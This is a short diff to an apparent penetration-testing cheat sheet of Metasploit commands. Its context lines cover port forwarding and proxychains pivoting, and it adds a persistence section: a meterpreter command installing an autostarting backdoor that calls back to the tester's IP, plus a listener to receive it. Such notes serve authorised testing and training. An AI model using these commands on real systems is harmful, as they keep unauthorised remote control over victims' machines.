@@ -174,4 +174,6 @@ meterpreter> portfwd add -l 3333 -p 3389 -r targetIP
 
 proxychains firefox // start a web browser through pivot for accessing website in new network
 
-
+PERSISTENCE 
+meterpreter> run persistence -A -X -i 5 -p 8080 -r ourIPaddress // setting persistence
+msf> use exploit/multi/handler // start listener with same options as above (same payload, IP address and local port
